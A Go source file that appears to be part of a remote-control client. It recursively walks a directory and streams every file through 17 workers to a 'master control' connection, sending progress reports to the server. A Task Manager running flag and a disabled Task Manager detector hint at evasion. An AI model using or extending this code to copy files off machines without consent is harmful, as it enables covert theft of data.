package uploader

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"sync"
	"sync/atomic"
	"time"
)

var (
	// 任务管理器是否开启
	TaskmgrRunning atomic.Bool

	ServerAddr string
	ClientName = "" // 定义全局用户名称
)

// 全局统一的上传队列和worker管理
var (
	// GlobalFileQueue chan FileQueueTask
	// GlobalUploadWorkers  int32 = 0
	ActiveUploadTasks atomic.Int32 // 正在扫描中的任务数
	// GlobalWorkerShutdown       = make(chan struct{})
	// GlobalWorkerWG       sync.WaitGroup
	PendingFiles atomic.Int64 // 新增：全局待上传文件计数
)

// 全局统一的文件任务结构体
type FileQueueTask struct {
	Path string
	Task *UploadTask // 保留引用，用于回调或统计（可选）
}

// 新的 UploadTask 结构体 (包含自己的队列和 Worker 管理)
type UploadTask struct {
	ClientID string
	RootPath string

	// 任务内部的队列和 Worker 管理
	FileQueue chan FileQueueTask // 新增：任务独有的文件队列
	wg        sync.WaitGroup     // 用于等待扫描和所有 Worker 完成
	workerWG  sync.WaitGroup     // 新增：用于等待所有 Worker 退出
	workers   int                // 新增：Worker 数量

	ScanEnd atomic.Bool // 扫描是否已结束

	Conn net.Conn // 主控连接
}

const (
	TaskQueueSize = 500 // 每个任务队列的容量限制为 500
)

type Config struct {
	ServerAddr           string
	ClientID             string
	MaxConcurrentUploads int
	SpeedLimitBytes      int64 // 0 = 不限速
}

type Uploader struct {
	cfg             Config
	connFunc        net.Conn
	SpeedLimitBytes int64
	BufferSize      int
}

func init() {
	// 全局初始化逻辑现在只包含定时打印全局进度
	go func() {
		ticker := time.NewTicker(1 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			pending := PendingFiles.Load()
			activeTasks := ActiveUploadTasks.Load()
			if pending > 0 || activeTasks > 0 {
				// 打印全局进度信息
				NotifyServer(fmt.Sprintf("\033[36m[全局进度] 待上传文件: %d | 活跃扫描任务: %d\033[0m", pending, activeTasks))
			}
		}
	}()
}

// 调用接口的信息转换
func New(cfg Config, factory net.Conn) *Uploader {
	if cfg.MaxConcurrentUploads == 0 {
		cfg.MaxConcurrentUploads = 5
	}

	// 全局变量给值
	GlobalUploadSem = make(chan struct{}, cfg.MaxConcurrentUploads)
	ServerAddr = cfg.ServerAddr
	ClientName = cfg.ClientID

	return &Uploader{
		cfg:             cfg,
		connFunc:        factory,
		SpeedLimitBytes: cfg.SpeedLimitBytes,
	}
}

func SafeGo(fn func()) {
	go func() {
		defer func() { recover() }()
		fn()
	}()
}

// 程序分发入口
func (u *Uploader) PatchDistribution(dirPath string) {

	// StartTaskManagerDetector(u.connFunc)

	// 检查路径是文件还是目录
	info, err := os.Stat(dirPath)
	if err != nil {
		// clog.LogMessage("路径错误：%v\n", err)
		return
	}

	// 流式目录上传
	task := &UploadTask{
		ClientID:  ClientName,
		RootPath:  dirPath,
		Conn:      u.connFunc,
		FileQueue: make(chan FileQueueTask, TaskQueueSize), // 初始化任务独有队列
		// workers:   MaxCheckUploadsSem - 2,                  // 从全局配置获取 worker 数量
		workers: 17, // 从全局配置获取 worker 数量
	}

	if info.IsDir() {
		task.StartWorkers()  // 先启动 Worker 消费队列
		task.StartScanning() // 再启动扫描生产队列
		task.StartReporter() // 启动队列长度报告

		// *** 关键修改：在这里调用 Wait，阻塞直到整个任务完成 ***
		task.Wait()
	} else {
		task.doSendFileWithOutArray(dirPath)
	}
}

// 启动任务独有的消费者 Workers (Worker 数量由 FILECHECK 决定,所以基本是按20算)
func (t *UploadTask) StartWorkers() {
	for i := 0; i < t.workers; i++ {
		t.workerWG.Add(1)
		SafeGo(func() {
			defer t.workerWG.Done()
			for ft := range t.FileQueue { // 循环直到队列被关闭
				PendingFiles.Add(-1) // 取出就-1
				_ = ft.Task.doSendFile(ft.Path)
			}
		})
	}
}

// 启动扫描 → 只负责把文件扔进全局队列
func (t *UploadTask) StartScanning() {
	ActiveUploadTasks.Add(1) // 活跃扫描任务 +1
	t.wg.Add(1)

	go func() {
		defer func() {
			t.ScanEnd.Store(true)
			ActiveUploadTasks.Add(-1) // 活跃扫描任务 -1
			t.wg.Done()

			close(t.FileQueue) // 扫描完成，关闭任务队列
			// 发送扫描完成通知
			NotifyServer(fmt.Sprintf("\033[32m目录%s扫描完成\033[0m", t.RootPath))
		}()

		err := filepath.WalkDir(t.RootPath, func(path string, d os.DirEntry, err error) error {
			if err != nil {
				logMsg := fmt.Sprintf("\033[31m访问路径失败 %q: %w\033[0m", path, err)
				fmt.Println(logMsg)
				return nil
			}

			PendingFiles.Add(1) // 投递前+1

			// 如果是目录,填充目录
			if d.IsDir() {
				path = "D|" + path
			}

			// 直接投递到任务队列（如果满了会阻塞，天然背压）
			t.FileQueue <- FileQueueTask{
				Path: path,
				Task: t,
			}

			return nil
		})

		if err != nil {
			logMsg := fmt.Sprintf("\033[31m目录扫描失败 %s: %v\033[0m", t.RootPath, err)
			fmt.Println(logMsg)
		}
	}()
}

// 启动每分钟报告队列长度的 goroutine
func (t *UploadTask) StartReporter() {
	SafeGo(func() {
		ticker := time.NewTicker(1 * time.Minute) // 每分钟发送一次报告
		defer ticker.Stop()
		for range ticker.C {
			queueLen := len(t.FileQueue)
			// 如果扫描未结束，或者队列中有待处理项，则报告
			if !t.ScanEnd.Load() || queueLen > 0 {
				logMsg := fmt.Sprintf("[队列报告] 任务 %s 队列长度: %d/%d", t.RootPath, queueLen, TaskQueueSize)
				NotifyServer(logMsg)
			}

			// 如果扫描已结束且队列为空，则 Reporter 退出
			if t.ScanEnd.Load() && queueLen == 0 {
				return
			}
		}
	})
}

// 等待当前任务彻底结束（扫描完 + 该任务的所有文件都上传完）
func (t *UploadTask) Wait() {
	t.wg.Wait()       // 等待 StartScanning 退出 (ScanEnd 被设为 true)
	t.workerWG.Wait() // 等待所有 Worker 退出 (FileQueue 被关闭)

	// 发送任务全部完成通知
	NotifyServer(fmt.Sprintf("\033[1;32m任务%s全部完成\033[0m", t.RootPath))
}
